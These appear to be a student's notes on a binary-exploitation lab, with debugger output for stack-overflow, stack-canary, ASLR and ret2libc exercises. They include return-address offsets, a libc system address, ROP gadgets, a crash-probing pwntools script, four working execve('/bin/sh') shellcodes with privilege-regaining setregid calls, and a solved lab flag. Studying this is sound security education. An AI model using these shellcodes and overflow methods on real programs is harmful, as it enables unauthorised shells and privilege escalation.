21 dep-0
```
 ► 0x56555678 <input_func+51>    call   read@plt <read@plt>
        fd: 0x0
        buf: 0xffffd0e0 ◂— 0x0
        nbytes: 0x100
```
```
pwndbg> info frame
Stack level 0, frame at 0xffffd170:
 eip = 0x56555678 in input_func; saved eip = 0x565556b7
 called by frame at 0xffffd1a0
 Arglist at 0xffffd168, args: 
 Locals at 0xffffd168, Previous frame's sp is 0xffffd170
 Saved registers:
  ebx at 0xffffd160, ebp at 0xffffd168, esi at 0xffffd164, eip at 0xffffd16c
```
`0xffffd16c - 0xffffd0e0`

```
pwndbg> p system
$1 = {int (const char *)} 0xf7e103d0 <__libc_system>
```
pwndbg> find 0xf7e103d0, +99999999, "/bin/sh"
0xf7f511db
warning: Unable to access 16000 bytes of target memory at 0xf7faede3, halting search.
1 pattern found.
`CS6332{l1bc_sy5t3M}`
22-dep-1
```
 ► 0x80488d7 <input_func+41>    call   read <read>
        fd: 0x0
        buf: 0xffffd0e0 ◂— 0x0
        nbytes: 0x100
```
```
 ► 0x80488e4 <input_func+54>    call   printf <printf>
        format: 0x80bb287 ◂— 'Hello %s!\n'
        vararg: 0xffffd0e0 ◂— 'hello\n'
```
```
pwndbg> info frame
Stack level 0, frame at 0xffffd170:
 eip = 0x80488e4 in input_func; saved eip = 0x8048908
 called by frame at 0xffffd1a0
 Arglist at 0xffffd168, args: 
 Locals at 0xffffd168, Previous frame's sp is 0xffffd170
 Saved registers:
  ebx at 0xffffd164, ebp at 0xffffd168, eip at 0xffffd16c
```
inside non_main_func
```
pwndbg> info frame
Stack level 0, frame at 0xffffd1a0:
 eip = 0x804890b in non_main_func; saved eip = 0x8048923
 called by frame at 0xffffd1c0
 Arglist at 0xffffd198, args: 
 Locals at 0xffffd198, Previous frame's sp is 0xffffd1a0
 Saved registers:
  ebp at 0xffffd198, eip at 0xffffd19c
```
after ret
```
pwndbg> info frame
Stack level 0, frame at 0xffffd1c0:
 eip = 0x8048923 in main; saved eip = 0x8048b61
 called by frame at 0xffffd220
 Arglist at 0xffffd1a8, args: 
 Locals at 0xffffd1a8, Previous frame's sp is 0xffffd1c0
 Saved registers:
  ebp at 0xffffd1a8, eip at 0xffffd1bc
```
```
pwndbg> disassemble some_function
Dump of assembler code for function some_function:
   0x08048894 <+0>:     push   ebp
   0x08048895 <+1>:     mov    ebp,esp
   0x08048897 <+3>:     sub    esp,0x8
   0x0804889a <+6>:     sub    esp,0x8
   0x0804889d <+9>:     push   0x0
   0x0804889f <+11>:    push   0x80bb268
   0x080488a4 <+16>:    call   0x806d2d0 <open>
   0x080488a9 <+21>:    add    esp,0x10
   0x080488ac <+24>:    leave  
   0x080488ad <+25>:    ret    
End of assembler dump.
```
```
pwndbg> x/s 0x80bb268
0x80bb268:      "a.txt"
```
```
pwndbg> disassemble read
Dump of assembler code for function read:
   0x0806d340 <+0>:     cmp    DWORD PTR gs:0xc,0x0
   0x0806d348 <+8>:     jne    0x806d36f <read+47>
   0x0806d34a <+0>:     push   ebx
   0x0806d34b <+1>:     mov    edx,DWORD PTR [esp+0x10]
   0x0806d34f <+5>:     mov    ecx,DWORD PTR [esp+0xc]
   0x0806d353 <+9>:     mov    ebx,DWORD PTR [esp+0x8]
   0x0806d357 <+13>:    mov    eax,0x3
   0x0806d35c <+18>:    call   DWORD PTR ds:0x80ea9f0
   0x0806d362 <+24>:    pop    ebx
   0x0806d363 <+25>:    cmp    eax,0xfffff001
   0x0806d368 <+30>:    jae    0x8070a90 <__syscall_error>
   0x0806d36e <+36>:    ret    
   0x0806d36f <+47>:    call   0x806edf0 <__libc_enable_asynccancel>
   0x0806d374 <+52>:    push   eax
   0x0806d375 <+53>:    push   ebx
   0x0806d376 <+54>:    mov    edx,DWORD PTR [esp+0x14]
   0x0806d37a <+58>:    mov    ecx,DWORD PTR [esp+0x10]
   0x0806d37e <+62>:    mov    ebx,DWORD PTR [esp+0xc]
   0x0806d382 <+66>:    mov    eax,0x3
   0x0806d387 <+71>:    call   DWORD PTR ds:0x80ea9f0
   0x0806d38d <+77>:    pop    ebx
   0x0806d38e <+78>:    xchg   DWORD PTR [esp],eax
   0x0806d391 <+81>:    call   0x806ee60 <__libc_disable_asynccancel>
   0x0806d396 <+86>:    pop    eax
   0x0806d397 <+87>:    cmp    eax,0xfffff001
   0x0806d39c <+92>:    jae    0x8070a90 <__syscall_error>
   0x0806d3a2 <+98>:    ret    
End of assembler dump.
pwndbg> disassemble write
Dump of assembler code for function write:
   0x0806d3b0 <+0>:     cmp    DWORD PTR gs:0xc,0x0
   0x0806d3b8 <+8>:     jne    0x806d3df <write+47>
   0x0806d3ba <+0>:     push   ebx
   0x0806d3bb <+1>:     mov    edx,DWORD PTR [esp+0x10]
   0x0806d3bf <+5>:     mov    ecx,DWORD PTR [esp+0xc]
   0x0806d3c3 <+9>:     mov    ebx,DWORD PTR [esp+0x8]
   0x0806d3c7 <+13>:    mov    eax,0x4
   0x0806d3cc <+18>:    call   DWORD PTR ds:0x80ea9f0
   0x0806d3d2 <+24>:    pop    ebx
   0x0806d3d3 <+25>:    cmp    eax,0xfffff001
   0x0806d3d8 <+30>:    jae    0x8070a90 <__syscall_error>
   0x0806d3de <+36>:    ret    
   0x0806d3df <+47>:    call   0x806edf0 <__libc_enable_asynccancel>
   0x0806d3e4 <+52>:    push   eax
   0x0806d3e5 <+53>:    push   ebx
   0x0806d3e6 <+54>:    mov    edx,DWORD PTR [esp+0x14]
   0x0806d3ea <+58>:    mov    ecx,DWORD PTR [esp+0x10]
   0x0806d3ee <+62>:    mov    ebx,DWORD PTR [esp+0xc]
   0x0806d3f2 <+66>:    mov    eax,0x4
   0x0806d3f7 <+71>:    call   DWORD PTR ds:0x80ea9f0
   0x0806d3fd <+77>:    pop    ebx
   0x0806d3fe <+78>:    xchg   DWORD PTR [esp],eax
   0x0806d401 <+81>:    call   0x806ee60 <__libc_disable_asynccancel>
   0x0806d406 <+86>:    pop    eax
   0x0806d407 <+87>:    cmp    eax,0xfffff001
   0x0806d40c <+92>:    jae    0x8070a90 <__syscall_error>
   0x0806d412 <+98>:    ret    
End of assembler dump.
```
```
0xf7ffd079 : pop ebp ; pop edx ; pop ecx ; ret
0x0809d635 : pop ebp ; pop esi ; pop edi ; ret
0xf7ffd055 : pop ebx ; pop ebp ; ret
0x0809994c : pop ebx ; pop edi ; ret
0x080483c9 : pop edi ; pop ebp ; ret
0x0806edb9 : pop ebx ; pop edx ; ret
0x080481c9 : pop ebx ; ret
0x080de8d1 : pop ecx ; ret
```
```
pwndbg> disassemble input_func
Dump of assembler code for function input_func:
   0x080488ae <+0>:     push   ebp
   0x080488af <+1>:     mov    ebp,esp
   0x080488b1 <+3>:     push   ebx
   0x080488b2 <+4>:     lea    ebx,[ebp-0x88]
   0x080488b8 <+10>:    sub    esp,0x88
   0x080488be <+16>:    push   0x18
   0x080488c0 <+18>:    push   0x80bb26e
   0x080488c5 <+23>:    push   0x1
   0x080488c7 <+25>:    call   0x806d3b0 <write>
   0x080488cc <+30>:    add    esp,0xc
   0x080488cf <+33>:    push   0x100
   0x080488d4 <+38>:    push   ebx
   0x080488d5 <+39>:    push   0x0
   0x080488d7 <+41>:    call   0x806d340 <read>
   0x080488dc <+46>:    pop    eax
   0x080488dd <+47>:    pop    edx
   0x080488de <+48>:    push   ebx
   0x080488df <+49>:    push   0x80bb287
   0x080488e4 <+54>:    call   0x804ede0 <printf>
   0x080488e9 <+59>:    xor    eax,eax
   0x080488eb <+61>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x080488ee <+64>:    leave  
   0x080488ef <+65>:    ret    
End of assembler dump.
```
20-stack-cookie
stack cookie:
```
pwndbg> checksec
[*] '/home/labs/unit2/20-stack-cookie/20-stack-cookie'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```
Note we have PIE disasbled and Canary found
run the script keep inputing  A with increased size
```
import struct

from pwn import *
from pwn import asm, context, gdb, p8, p16, p32, process

context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "DEBUG"
p = process(["./20-stack-cookie"])
i = 1
while True:
    p.recvline()  # you have XX trials left
    p.recvline()  # how many bytes?

    p.sendline(f"{i}".encode())

    p.recvline()  # reading X bytes

    p.sendline(b"A" * i)

    p.recvline()  # Hello YYYY!
    rec = p.recvline()  # Exit Status 0

    if rec != b"Exit status: 0\n":
        print(rec)
        print(f"When processing {i} bytes stack crashed")
        exit(1)
    print(f"Success processed {i} bytes to the stack")
    i += 1

p.close()
```
and finally we have
```
b'*** stack smashing detected ***: <unknown> terminated\n'
When processing 129 bytes stack crashed
[*] Stopped process './20-stack-cookie' (pid 13747)
```
run gdb to find the read string buffer
```
 ► 0x8048658 <input_func+101>    call   read@plt <read@plt>
        fd: 0x0
        buf: 0xffffd0cc ◂— 0x0
        nbytes: 0x0
```
start of buffer is `0xffffd0cc`
do `info frame`
we have 
```
pwndbg> info frame
Stack level 0, frame at 0xffffd160:
 eip = 0x8048658 in input_func; saved eip = 0x80486db
 called by frame at 0xffffd190
 Arglist at 0xffffd158, args: 
 Locals at 0xffffd158, Previous frame's sp is 0xffffd160
 Saved registers:
  ebp at 0xffffd158, eip at 0xffffd15c
```
return addr is `0xffffd15c`

We find system address 
```
pwndbg> p system
$1 = {int (const char *)} 0xf7e103d0 <__libc_system>
```
we want to find the shell address which is: we run 
```
pwndbg> find 0xf7e103d0, +99999999,"/bin/sh"
0xf7f511db
warning: Unable to access 16000 bytes of target memory at 0xf7faede3, halting search.
1 pattern found.
```
Question: how to find shellcode address?
```
system_addr = 0xf7e103d0
shell_addr = ~~0xf7faede3~~
```
aslr-1
this is the read buffer:
```
 ► 0x56557636 <input_func+81>    call   read@plt <read@plt>
        fd: 0x0
        buf: 0xfffe5f70 ◂— 0x0
        nbytes: 0x100
```
```
pwndbg> info frame
Stack level 0, frame at 0xfffe6000:
 eip = 0x56557636 in input_func; saved eip = 0x56557683
 called by frame at 0xfffe6030
 Arglist at 0xfffe5ff8, args: 
 Locals at 0xfffe5ff8, Previous frame's sp is 0xfffe6000
 Saved registers:
  ebx at 0xfffe5ff4, ebp at 0xfffe5ff8, eip at 0xfffe5ffc
```
`0xfffe5ffc - 0xfffe5f70 = 140`
11-stackoverflow
```
 ► 0x4005df <input_func+79>     call   read@plt <read@plt>
        fd: 0x0
        buf: 0x7fffffffdf00 ◂— 0x0
        nbytes: 0x100
```
and `info frame` shows
```
pwndbg> info frame
Stack level 0, frame at 0x7fffffffdfa0:
 rip = 0x4005df in input_func; saved rip = 0x400637
 called by frame at 0x7fffffffdfc0
 Arglist at 0x7fffffffdf90, args: 
 Locals at 0x7fffffffdf90, Previous frame's sp is 0x7fffffffdfa0
 Saved registers:
  rbp at 0x7fffffffdf90, rip at 0x7fffffffdf98
```
so `0x7fffffffdf98 - 0x7fffffffdf00` = 0x98 = 152
12 stack overflow using envp
```
 ► 0x80484cf <input_func+28>    call   read@plt <read@plt>
        fd: 0x0
        buf: 0xffffd0fc —▸ 0xf7eccaf3 (prctl+35) ◂— pop    ebx
        nbytes: 0x14
```

```
pwndbg> info frame
Stack level 0, frame at 0xffffd110:
 eip = 0x80484cf in input_func; saved eip = 0x8048500
 called by frame at 0xffffd140
 Arglist at 0xffffd108, args: 
 Locals at 0xffffd108, Previous frame's sp is 0xffffd110
 Saved registers:
  ebx at 0xffffd104, ebp at 0xffffd108, eip at 0xffffd10c
```
so `0xffffd10c -0xffffd0fc = 16`
13 stack overflow not using envp
```
 ► 0x555555554808 <input_func+35>    call   read@plt <read@plt>
        fd: 0x0
        buf: 0x7fffffffdf8c ◂— 0xffffdff800007fff
        nbytes: 0x24
```

```
pwndbg> info frame
Stack level 0, frame at 0x7fffffffdfb0:
 rip = 0x555555554808 in input_func; saved rip = 0x555555554885
 called by frame at 0x7fffffffdff0
 Arglist at 0x7fffffffdf80, args: 
 Locals at 0x7fffffffdf80, Previous frame's sp is 0x7fffffffdfb0
 Saved registers:
  rbx at 0x7fffffffdf98, rbp at 0x7fffffffdfa0, rip at 0x7fffffffdfa8
```
`0x7fffffffdfa8-0x7fffffffdf8c = 0x1c = 28`

aslr-2 
```
 ► 0x5657865e <input_func+61>    call   read@plt <read@plt>
        fd: 0x0
        buf: 0xffbf34a0 —▸ 0xf7f5f000 (_GLOBAL_OFFSET_TABLE_) ◂— xor    al, 0x6f /* 0x26f34 */
        nbytes: 0x100
```
```
pwndbg> info frame
Stack level 0, frame at 0xffbf3530:
 eip = 0x5657865e in input_func; saved eip = 0x5657869e
 called by frame at 0xffbf3540
 Arglist at 0xffbf3528, args: 
 Locals at 0xffbf3528, Previous frame's sp is 0xffbf3530
 Saved registers:
  ebx at 0xffbf3524, ebp at 0xffbf3528, eip at 0xffbf352c
```
`0xffbf352c-0xffbf34a0=140`
1-shellcode:
Just do translation to corresponding register.
```
shellcode = asm("""
/* setregid(getegid(), getegid()) */
mov eax, 0x32 /* sys_getegid = 50, make it 32 bits */
int 0x80 /* eax <- egid */
mov ebx, eax /* rgid = egid */
mov ecx, eax /* egid = egid */
mov eax, 0x47 /* sys_setregid = 71 */
int 0x80
/* execve("/bin/sh", 0, 0) */
push 0 /* NUL terminator */
push 0x68732f2f /* "//sh" */
push 0x6e69622f /* "/bin" */
mov ebx, esp /* filename */
mov ecx, 0 /* argv = 0 */
mov edx, 0 /* envp = 0 */
mov eax, 0x0b /* sys_execve = 11 */
int 0x80
""")
```
2-shellcode
same but a 64 bit version
```
mov rax, 108; syscall /* Result in rax* /

/* Call setregid with that result: */

mov rdi, rax

mov rsi, rax

mov rax, 114; syscall

  

/* Build the string /bin/sh somewhere (often by pushing onto the stack). */

/*push 0x68732f2f */ /* "//sh" */

/*push 0x6e69622f */ /* "/bin" */

/* /bin/sh -> 2f62696e2f7368 -> 68 73 2f 6e 69 62 2f

/* */

push 0 /* create a null byte */

mov rbx, 0x68732f2f6e69622f /* bytes in memory: "/bin//sh"*/

push rbx /* Pushes that 8-byte value onto the stack */

mov rdi, rsp /* execve’s first argument */

mov rsi, 0 /* second syscall argument */

mov rdx, 0 /* third syscall argument */

mov rax, 59 /* kernel executes execve */

syscall
```
3-non-zero-shellcode-32 bit
shellcode = asm(
```
"""

/* getegid(); setregid(egid, egid) */

xor eax, eax /* 31 c0 */

mov al, 0x32 /* b0 32 */

int 0x80 /* cd 80 ; getegid -> eax */

push eax /* 50 ; save gid */

pop ebx /* 5b ; ebx = gid */

push eax

pop ecx /* 59 ; ecx = gid */

  

xor eax, eax

mov al, 0x47 /* b0 47 */

int 0x80 /* cd 80 ; setregid(ebx, ecx) */

  

/* execve("/bin/sh", 0, 0) */

xor eax, eax /* zero eax */

push eax /* push 0 (terminator) */

push 0x68732f2f /* push "//sh" (2f2f7368) */

push 0x6e69622f /* push "/bin" (2f62696e) */

mov ebx, esp /* pointer to "/bin//sh" */

xor ecx, ecx /* argv = 0 */

xor edx, edx /* envp = 0 */

mov al, 0x0b /* execve */

int 0x80

"""
```
4-non-zero-shellcode 64 bit
```
shellcode = asm(

f"""

xor eax, eax /* RAX = 0 (31 C0), clears high 56 bits */

mov al, 108 /* RAX = 108 (getegid), 'B0 6C' has no 00 */

syscall /* getegid() -> returns egid in RAX */

  

mov rdi, rax /* RDI = rgid = returned egid (48 89 C7) */

mov rsi, rax /* RSI = egid = returned egid (48 89 C6) */

  

xor eax, eax /* RAX = 0 (zero before 8-bit write) */

mov al, 114 /* RAX = 114 (setregid) */

syscall /* setregid(rdi, rsi) */

  

/* execve("/bin//sh", 0, 0) -- zero-free encoding */

xor eax, eax /* EAX=0 (31 C0) */

push rax /* push 8 runtime zeros (50) */

mov rbx, 0x68732f2f6e69622f /* "/bin//sh" (no 00 bytes) */

push rbx

mov rdi, rsp /* filename */

mov rsi, rax /* argv = 0 */

mov rdx, rax /* envp = 0 */

mov al, 59 /* execve */

syscall

"""

)

outpath = os.path.abspath("shellcode.bin")

with  open("shellcode.bin", "wb") as f:

f.write(shellcode)

p = process(['./04-nonzero-shellcode-64'])

p.interactive()
```